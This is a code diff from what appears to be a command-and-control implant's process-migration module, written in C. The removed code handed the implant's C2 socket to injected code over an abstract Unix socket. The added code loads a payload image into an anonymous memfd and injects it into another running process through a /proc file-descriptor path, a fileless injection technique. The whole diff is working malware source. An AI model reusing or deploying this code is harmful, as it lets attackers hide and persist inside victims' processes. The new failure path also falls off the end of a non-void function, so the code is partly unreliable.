@@ -29,10 +29,6 @@
 #include <stddef.h>
 #include <fcntl.h>
 
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <sys/un.h>
-
 #if IS_LINUX
 #include <syscall.h>
 #endif
@@ -44,58 +40,12 @@
 #include <c2.h>
 #include <log.h>
 #include <migrate.h>
-#include <net_client.h>
 
-static int shared_listen(const char *name)
-{
-    int shared;
-    struct sockaddr_un address;
-
-    memset(&address, 0, sizeof(address));
-
-    shared = socket(AF_UNIX, SOCK_STREAM, 0);
-    address.sun_family = AF_UNIX;
-    strcpy(address.sun_path, name);
-
-    address.sun_path[0] = 0;
-    bind(shared, (struct sockaddr *)&address, sizeof(address));
-
-    listen(shared, 100);
-    return accept(shared, NULL, NULL);
-}
-
-static ssize_t shared_send_sock(int shared, const void *buf,
-                                size_t length, int sock)
-{
-    struct iovec iov;
-    struct msghdr msg;
-    struct cmsghdr *pcmsghdr;
-
-    char buffer[CMSG_SPACE(sizeof(int))];
-
-    iov.iov_base = (void*)buf;
-    iov.iov_len = length;
-    msg.msg_name = NULL;
-    msg.msg_namelen = 0;
-    msg.msg_iov = &iov;
-    msg.msg_iovlen = 1;
-    msg.msg_control = buffer;
-    msg.msg_controllen = sizeof(buffer);
-    msg.msg_flags = 0;
-
-    pcmsghdr = CMSG_FIRSTHDR(&msg);
-    pcmsghdr->cmsg_len = CMSG_LEN(sizeof(int));
-    pcmsghdr->cmsg_level = SOL_SOCKET;
-    pcmsghdr->cmsg_type = SCM_RIGHTS;
-
-    *((int*)CMSG_DATA(pcmsghdr)) = sock;
-    return sendmsg(shared, &msg, 0);
-}
-
-static int migrate_inject(pid_t pid, char *path, int sock)
+static int migrate_inject(pid_t pid, char *path)
 {
     int shared;
     char buffer[4];
+
     injector_t *injector;
 
     if (injector_attach(&injector, pid) < 0)
@@ -107,24 +57,55 @@ static int migrate_inject(pid_t pid, char *path, int sock)
     log_debug("* Attached to the process (%d)\n", pid);
 
 #ifdef INJECTOR_HAS_INJECT_IN_CLONED_THREAD
-    injector_inject_in_cloned_thread(injector, path, NULL);
+    if (injector_inject_in_cloned_thread(injector, path, NULL) < 0)
+    {
+        goto fail;
+    }
 #else
-    injector_inject(injector, path, NULL);
+    if (injector_inject(injector, path, NULL) < 0)
+    {
+        goto fail;
+    }
 #endif
 
     log_debug("* Injected to the process (%d)\n", pid);
-
-    shared = shared_listen("#IPCSocket");
-    memset(buffer, 0, 4);
-    shared_send_sock(shared, buffer, 4, sock);
+    injector_detach(injector);
 
     return 0;
+
+fail:
+    log_debug("* Failed to inject (%s)\n", injector_error());
+    injector_detach(injector);
 }
 
-int migrate_init(pid_t pid, char *path, c2_t *c2)
+int migrate_init(pid_t pid, int length, unsigned char *image)
 {
-    net_t *net;
-    net = c2->tunnel->data;
+    ssize_t count;
+    size_t done;
+    int fd;
+    char path[PATH_MAX];
 
-    return migrate_inject(pid, path, net->io->pipe[0]);
+    done = 0;
+    fd = syscall(SYS_memfd_create, "sas", 0);
+
+    if (ftruncate(fd, length) < 0)
+    {
+        log_debug("* Unable to write object to file (%d)\n", fd);
+        return -1;
+    }
+
+    log_debug("* Writing object to file (%d)\n", fd);
+
+    while (done < length)
+    {
+        if ((count = write(fd, image + done, length - done)) < 0)
+        {
+            return -1;
+        }
+
+        done += count;
+    }
+
+    sprintf(path, "/proc/%d/fd/%d", getpid(), fd);
+    return migrate_inject(pid, path);
 }
